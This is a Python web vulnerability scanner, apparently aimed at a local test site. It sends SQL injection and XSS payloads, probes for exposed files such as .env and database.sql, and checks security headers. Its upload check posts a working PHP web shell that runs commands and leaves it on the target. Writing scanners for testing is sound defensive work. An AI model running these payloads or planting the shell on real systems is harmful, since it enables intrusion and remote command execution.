import requests
from bs4 import BeautifulSoup
import urllib.parse
import sys

headers = {
    "User-Agent": "Simple-Vuln-Scanner/1.0"
}

# ---------------------------
# Basic GET Request Checker
# ---------------------------
def check_page(url):
    try:
        r = requests.get(url, headers=headers)
        print(f"[+] Connected: {url} ({r.status_code})")
        return r.text
    except:
        print(f"[-] Cannot connect to {url}")
        return None


# ---------------------------
# SQL Injection Check
# ---------------------------
def check_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR 1=1 --", "\" OR 1=1 --"]
    printable = False

    for p in payloads:
        test_url = url + p
        r = requests.get(test_url)

        if "Warning" in r.text or "syntax" in r.text or "mysqli" in r.text:
            print(f"[!!!] SQL Injection Detected → {test_url}")
            printable = True
            break

    if not printable:
        print("[+] No SQL Injection Found")


# ---------------------------
# XSS Check
# ---------------------------
def check_xss(url):
    payload = "<script>alert(1)</script>"
    test_url = url + "?msg=" + urllib.parse.quote(payload)

    r = requests.get(test_url)

    if payload in r.text:
        print(f"[!!!] XSS Vulnerability Found → {test_url}")
    else:
        print("[+] No XSS Detected")


# ---------------------------
# Security Header Check
# ---------------------------
def check_headers(url):
    r = requests.get(url)
    missing = []

    required_headers = [
        "X-Frame-Options",
        "Content-Security-Policy",
        "X-XSS-Protection",
        "Strict-Transport-Security"
    ]

    for h in required_headers:
        if h not in r.headers:
            missing.append(h)

    if missing:
        print("[!!!] Missing Security Headers:")
        for h in missing:
            print("      - " + h)
    else:
        print("[+] All Security Headers Present")


# ---------------------------
# Directory Listing Check
# ---------------------------
def check_directory_listing(url):
    r = requests.get(url)

    if "<title>Index of" in r.text:
        print("[!!!] Directory Listing Enabled → " + url)
    else:
        print("[+] Directory Listing Disabled")


# ---------------------------
# Sensitive Data Exposure
# ---------------------------
def check_sensitive_files(url):
    files = [
        "config.php", "db.php", "backup.zip",
        ".env", "users.txt", "database.sql"
    ]

    for f in files:
        test_url = url + "/" + f
        r = requests.get(test_url)
        if r.status_code == 200 and "error" not in r.text.lower():
            print(f"[!!!] Sensitive File Accessible → {test_url}")


# ---------------------------
# File Upload Vulnerability Check
# ---------------------------
def check_file_upload(url):
    try:
        test_url = url + "/upload.php"

        # upload PHP shell
        files = {
            "file": ("shell.php", "<?php system($_GET['cmd']); ?>")
        }

        r = requests.post(test_url, files=files)

        if "Uploaded" in r.text:
            print("[!!!] Unrestricted File Upload Detected")
        else:
            print("[+] File Upload Secured (Maybe)")
    except:
        print("[-] File Upload Check Failed")


# ---------------------------
# Start Scanner
# ---------------------------
def start_scan(base_url):
    if not base_url.endswith("/"):
        base_url += "/"

    print("\n=== Simple Vulnerability Scanner ===")
    print("Scanning:", base_url)
    print("====================================\n")

    check_page(base_url)
    check_sql_injection(base_url + "index.php?username=")
    check_xss(base_url + "dashboard.php")
    check_headers(base_url)
    check_directory_listing(base_url)
    check_sensitive_files(base_url)
    check_file_upload(base_url)

    print("\nScan Completed!\n")


# ---------------------------
# Main
# ---------------------------
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python vuln_scanner.py http://localhost/vulnsite/")
        exit()

    start_scan(sys.argv[1])
